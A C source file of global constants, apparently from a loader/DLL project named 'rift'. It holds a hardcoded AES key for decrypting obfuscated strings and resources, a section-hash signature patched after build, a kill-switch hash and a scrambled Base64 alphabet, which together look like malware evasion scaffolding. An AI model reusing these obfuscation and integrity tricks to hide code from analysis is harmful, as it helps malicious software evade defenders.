#ifdef _riftldr
#include "..\_riftldr\_riftldr.h"
#elif _riftdll
#include "..\_riftdll\_riftdll.h"
#elif _riftTool
#include "..\_riftTool\_riftTool.h"
#endif

// Global Process Information Block
PPIB g_PIB;

/* Contains the expected Hash of Section in the Image.
   This is only a Signature and has to be patched out with _riftTool. */
CONST SIG e_HashSig = {	".SectionHashSig", "xxxxxxxxxxxxxxxx", 16 };

CONST CHAR e_pszSections[][8] = {
	".rdata\0",   // Special
	".rsrc\0\0",  // Ignore
	// ".reloc\0" // Ignore (not sure if UpdateResource might mess with this)
};
CONST SIZE_T e_nSections = sizeof(e_pszSections) / sizeof(*e_pszSections);

/* The Current AesInternalKey used to decrypt Internal Data,
   this Key is hardcoded and should not be changed.
   Changing this Key would requirer to reencrypt all Data that is based on this Key,
   this includes all obfuscated Strings and even external Resources. */
CONST BYTE e_IKey[AES_KEY_SIZE] = {
	0xd9, 0xbf, 0x99, 0x27, 0x18, 0xca, 0x6a, 0xf6,
	0xb4, 0xd5, 0xd4, 0x67,	0x4e, 0xf5, 0xf9, 0x01
};
// KillSwitch Data Hash
DEPRECATED CONST BYTE e_KillSwitchHash[sizeof(MD5)] = {
	0xc5, 0xc9, 0x2b, 0x4e, 0xe2, 0xc4, 0x61, 0x8f,
	0x65, 0x59, 0xf1, 0x98, 0x48, 0xae, 0xf5, 0x3b
};

#if 1
// Crypto Base64 Charset
CONST CHAR e_Base64Table[] = { "!§$%&/()?{[]}+*@~#qwertyuiopQWERTYUIOP<,.->;:_|asdfghjklASDFGHJK" };
#else
// Standard Base64 CharSet
CONST CHAR e_Base64Table[] = { "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" };
#endif